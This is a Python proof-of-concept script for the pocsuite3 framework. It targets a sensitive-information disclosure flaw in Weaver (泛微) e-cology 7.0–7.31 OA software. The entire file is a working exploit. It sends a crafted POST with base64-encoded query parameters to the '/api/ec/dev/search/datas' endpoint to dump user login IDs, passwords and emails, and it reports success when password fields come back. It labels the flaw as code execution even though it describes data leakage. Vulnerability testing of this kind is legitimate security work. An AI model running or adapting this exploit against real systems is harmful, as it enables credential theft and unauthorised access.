from pocsuite3.api import Output, POCBase, register_poc, requests, logger, VUL_TYPE, POC_CATEGORY, OptDict
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str
from collections import OrderedDict

class TestPOC(POCBase):
    vulID = '000'  # ssvid
    version = '1.0'
    name = '泛微 e-cology datas 存在敏感信息泄漏漏洞'
    appName = '泛微 e-cology'
    appVersion = '7.0~7.31'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''泛微 e-cology datas 存在敏感信息泄漏漏洞 ，攻击者通过漏洞可以获取OA中的用户敏感信息'''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _verify(self):
        result = {}
        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36",
            "Referer":self.url
        }
        data = 'type=&sqlParams={"tFields":"Kg==","tFrom":"SHJtUmVzb3VyY2U=","tOrder":"aWQ=","tWhere":""}&columns=[{"dataIndex":"loginid"},{"dataIndex":"password"},{"dataIndex":"email"},{"dataIndex":"id"}]&sumCloumns=&min=0&max=100'        
        path = '/api/ec/dev/search/datas'   
        vul_url = self.url+path
        resp = requests.post(vul_url, verify = False, allow_redirects = False, data = data,headers = headers, timeout = 10)
        if resp.status_code == 200 and '{"datas":[{"id' in resp.text and '"passwordspan":"' in resp.text and '"password":' in resp.text:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = vul_url
        return self.parse_output(result)

    def parse_output(self,result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
register_poc(TestPOC)
